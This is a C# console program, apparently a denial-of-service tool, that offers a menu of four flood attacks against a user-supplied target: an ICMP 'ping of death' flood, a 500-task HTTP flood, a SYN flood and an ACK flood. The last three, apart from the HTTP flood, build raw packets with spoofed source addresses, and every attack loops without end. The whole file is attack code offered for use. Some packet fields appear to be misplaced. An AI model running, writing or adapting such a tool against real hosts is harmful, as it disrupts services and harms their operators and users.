using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class Program
{
    static async Task Main(string[] args)
    {
        Console.WriteLine(@"░       ░░░        ░░   ░░░  ░░        ░░░      ░░░  ░░░░░░░░░░░░░░░      ░░░        ░░░░░░░░░      ░░░        ░░       ░░░  ░░░░  ░░        ░░░      ░░░        ░
▒  ▒▒▒▒  ▒▒  ▒▒▒▒▒▒▒▒    ▒▒  ▒▒▒▒▒  ▒▒▒▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒▒▒▒  ▒▒▒▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒▒▒▒
▓  ▓▓▓▓  ▓▓      ▓▓▓▓  ▓  ▓  ▓▓▓▓▓  ▓▓▓▓▓  ▓▓▓▓  ▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓  ▓▓      ▓▓▓▓▓▓▓▓▓▓▓      ▓▓▓      ▓▓▓▓       ▓▓▓▓  ▓▓  ▓▓▓▓▓▓  ▓▓▓▓▓  ▓▓▓▓▓▓▓▓      ▓▓▓
█  ████  ██  ████████  ██    █████  █████        ██  ██████████████  ████  ██  ████████████████████  ██  ████████  ███  █████    ███████  █████  ████  ██  ███████
█       ███        ██  ███   ██        ██  ████  ██        █████████      ███  ███████████████      ███        ██  ████  █████  █████        ███      ███        █
                                                                                                                                                                  
                                                                                                                                                  
███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████");

        Console.WriteLine(@"Tools:
        __________________________________
        |(1) ping of death   (4)ack flood|            recomendations : (1) the ping of death should be used for ip addresses that have closes or no ports
        |(2) http flood                  |            
        |(3) syn flood                   |
        _________________________________");
Console.Write("Pick the number you want to use: ");
        string num = Console.ReadLine();

        if (num == "1")
        {
            Console.Write("Enter the target IP: ");
            string target = Console.ReadLine();
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
            sock.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
            byte[] buffer = new byte[84];
            int numberOfTimes = 0;

            while (true)
            {
                numberOfTimes++;
                BuildPacket(buffer, target);
                var endpoint = new IPEndPoint(IPAddress.Parse(target), 0);
                await sock.SendToAsync(new ArraySegment<byte>(buffer), SocketFlags.None, endpoint);
                Console.WriteLine("<----- Number of packets sent: " + numberOfTimes + " ------->");
            }
        }
        else if (num == "2")
{
    Console.Write("Host: ");
    string host = Console.ReadLine();
    IPAddress[] ipAddresses = await Dns.GetHostAddressesAsync(host);
    string ip = ipAddresses[0].ToString();

    Console.Write("Port: ");
    if (!int.TryParse(Console.ReadLine(), out int port)) port = 80;

    int threads = 500;
    int speedPerRun = 100;
    byte[] junkPayload = Encoding.ASCII.GetBytes("X-Junk: " + new string('A', 2000));

    async Task Attack()
    {
        int httpfloodtimes = 0;
        while (true)
        {
            try
            {
                using (var client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                {
                    await client.ConnectAsync(ip, port);
                    string request = $"GET / HTTP/1.1\r\nHost: {host}\r\n{Encoding.ASCII.GetString(junkPayload)}\r\nConnection: keep-alive\r\n\r\n";
                    byte[] requestData = Encoding.ASCII.GetBytes(request);
                    for (int i = 0; i < speedPerRun; i++)
                        await client.SendAsync(new ArraySegment<byte>(requestData), SocketFlags.None);
                    Console.WriteLine("<---- packet sent " + httpfloodtimes + " times ---->");
                }
            }
            catch { }
        }
    }

    Task[] taskPool = new Task[threads];
    for (int i = 0; i < threads; i++) taskPool[i] = Task.Run(Attack);
    await Task.WhenAll(taskPool);
}

        else if (num == "3")
        {
            Console.Write("Enter target IP: ");
            string target = Console.ReadLine();
            Console.Write("Enter target port: ");
            int ddport = int.Parse(Console.ReadLine());
            Console.Write("Enter number of threads: ");
            int threads = int.Parse(Console.ReadLine());

            Console.WriteLine("Starting attack...");
            await Task.Delay(2000);

            Task[] tasks = new Task[threads];
            for (int i = 0; i < threads; i++) tasks[i] = TcpDos(target, ddport);
            await Task.WhenAll(tasks);
        }
        else if (num == "4")
{
    Console.Write("Target IP: ");
    string dstIP = Console.ReadLine();
    Console.Write("Target Port: ");
    int dstPort = int.Parse(Console.ReadLine());

    Console.WriteLine("Starting ACK flood...");
    await Task.Delay(1000);

    int threads = 500;
    Task[] tasks = new Task[threads];
    for (int i = 0; i < threads; i++)
        tasks[i] = Task.Run(() => AckFlood(dstIP, dstPort));

    await Task.WhenAll(tasks);
}

    }
    static void AckFlood(string dstIP, int dstPort)
{
    Random rand = new Random();
    byte[] dstIpBytes = IPAddress.Parse(dstIP).GetAddressBytes();
    IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(dstIP), dstPort);

    while (true)
    {
        try
        {
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Tcp);
            socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);

            byte[] srcIp = new byte[] {
                (byte)rand.Next(1, 255),
                (byte)rand.Next(0, 255),
                (byte)rand.Next(0, 255),
                (byte)rand.Next(1, 255)
            };

            ushort srcPort = (ushort)rand.Next(1024, 65535);
            int seq = rand.Next(1000, 9000);
            int win = rand.Next(1000, 9000);

            byte[] packet = new byte[40];
            packet[0] = 0x45;
            packet[1] = 0x00;
            packet[2] = 0x00;
            packet[3] = 0x28;
            packet[4] = 0x00;
            packet[5] = 0x00;
            packet[6] = 0x40;
            packet[7] = 0x00;
            packet[8] = 128;
            packet[9] = 6;
            packet[10] = 0;
            packet[11] = 0;
            Buffer.BlockCopy(srcIp, 0, packet, 12, 4);
            Buffer.BlockCopy(dstIpBytes, 0, packet, 16, 4);
            packet[20] = (byte)(srcPort >> 8);
            packet[21] = (byte)(srcPort & 0xFF);
            packet[22] = (byte)(dstPort >> 8);
            packet[23] = (byte)(dstPort & 0xFF);
            packet[24] = (byte)((seq >> 24) & 0xFF);
            packet[25] = (byte)((seq >> 16) & 0xFF);
            packet[26] = (byte)((seq >> 8) & 0xFF);
            packet[27] = (byte)(seq & 0xFF);
            packet[28] = 0;
            packet[29] = 0;
            packet[30] = 0x50;
            packet[31] = 0x10; // ACK flag
            packet[32] = (byte)(win >> 8);
            packet[33] = (byte)(win & 0xFF);
            packet[34] = 0;
            packet[35] = 0;
            packet[36] = 0;
            packet[37] = 0;
            packet[38] = 0;
            packet[39] = 0;

            socket.SendTo(packet, endPoint);
            socket.Close();
        }
        catch { }
    }
}

    static void BuildPacket(byte[] buffer, string target)
    {
        var rnd = new Random();
        buffer[0] = 0x45;
        buffer[1] = 0;
        buffer[2] = 0;
        buffer[3] = 84;
        buffer[4] = 0;
        buffer[5] = 0;
        buffer[6] = 0;
        buffer[7] = 0;
        buffer[8] = 128;
        buffer[9] = 1;
        buffer[10] = 0;
        buffer[11] = 0;
        var srcIP = GetRandomIPBytes(rnd);
        Buffer.BlockCopy(srcIP, 0, buffer, 12, 4);
        var dstIP = IPAddress.Parse(target).GetAddressBytes();
        Buffer.BlockCopy(dstIP, 0, buffer, 16, 4);
        ushort ipChecksum = Checksum(buffer, 0, 20);
        buffer[10] = (byte)(ipChecksum >> 8);
        buffer[11] = (byte)(ipChecksum & 0xff);
        buffer[20] = 8;
        buffer[21] = 0;
        buffer[22] = 0;
        buffer[23] = 0;
        buffer[24] = 0;
        buffer[25] = 1;
        buffer[26] = 0;
        buffer[27] = 1;
        for (int i = 28; i < 84; i++) buffer[i] = (byte)'m';
        ushort icmpChecksum = Checksum(buffer, 20, 64);
        buffer[22] = (byte)(icmpChecksum >> 8);
        buffer[23] = (byte)(icmpChecksum & 0xff);
    }

    static byte[] GetRandomIPBytes(Random rnd)
    {
        byte[] ip = new byte[4];
        ip[0] = (byte)rnd.Next(11, 197);
        ip[1] = (byte)rnd.Next(0, 256);
        ip[2] = (byte)rnd.Next(0, 256);
        ip[3] = (byte)rnd.Next(2, 254);
        return ip;
    }

    static ushort Checksum(byte[] buffer, int offset, int length)
    {
        uint sum = 0;
        for (int i = offset; i < offset + length; i += 2)
            sum += (ushort)((buffer[i] << 8) + buffer[i + 1]);
        while ((sum >> 16) != 0)
            sum = (sum & 0xFFFF) + (sum >> 16);
        return (ushort)~sum;
    }

    static async Task TcpDos(string targetIp, int targetPort)
    {
        Random rand = new Random();
        IPAddress targetAddress = IPAddress.Parse(targetIp);
        IPEndPoint endPoint = new IPEndPoint(targetAddress, targetPort);
        byte[] spoofedIpBytes = new byte[] { 172, 17, 130, 12 };

        while (true)
        {
            try
            {
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Tcp);
                socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
                ushort sourcePort = (ushort)rand.Next(1024, 65535);
                byte[] packet = BuildSynPacket(spoofedIpBytes, targetAddress.GetAddressBytes(), sourcePort, (ushort)targetPort);
                await socket.SendToAsync(new ArraySegment<byte>(packet), SocketFlags.None, endPoint);
                socket.Close();
            }
            catch { }
            await Task.Yield();
        }
    }

    static byte[] BuildSynPacket(byte[] srcIp, byte[] dstIp, ushort srcPort, ushort dstPort)
    {
        byte[] packet = new byte[40];
        packet[0] = 0x45;
        packet[1] = 0x00;
        ushort totalLength = (ushort)packet.Length;
        packet[2] = (byte)(totalLength >> 8);
        packet[3] = (byte)(totalLength & 0xFF);
        packet[4] = 0x00;
        packet[5] = 0x00;
        packet[6] = 0x40;
        packet[7] = 0x00;
        packet[8] = 128;
        packet[9] = 6;
        packet[10] = 0;
        packet[11] = 0;
        Buffer.BlockCopy(srcIp, 0, packet, 12, 4);
        Buffer.BlockCopy(dstIp, 0, packet, 16, 4);
        packet[20] = (byte)(srcPort >> 8);
        packet[21] = (byte)(srcPort & 0xFF);
        packet[22] = (byte)(dstPort >> 8);
        packet[23] = (byte)(dstPort & 0xFF);
        Random rand = new Random();
        int seq = rand.Next();
        packet[24] = (byte)((seq >> 24) & 0xFF);
        packet[25] = (byte)((seq >> 16) & 0xFF);
        packet[26] = (byte)((seq >> 8) & 0xFF);
        packet[27] = (byte)(seq & 0xFF);
        packet[28] = 0;
        packet[29] = 0;
        packet[30] = 0;
        packet[31] = 0;
        packet[32] = 0x50;
        packet[33] = 0x02;
        packet[34] = 0x72;
        packet[35] = 0x10;
        packet[36] = 0;
        packet[37] = 0;
        packet[38] = 0;
        packet[39] = 0;
        return packet;
    }
}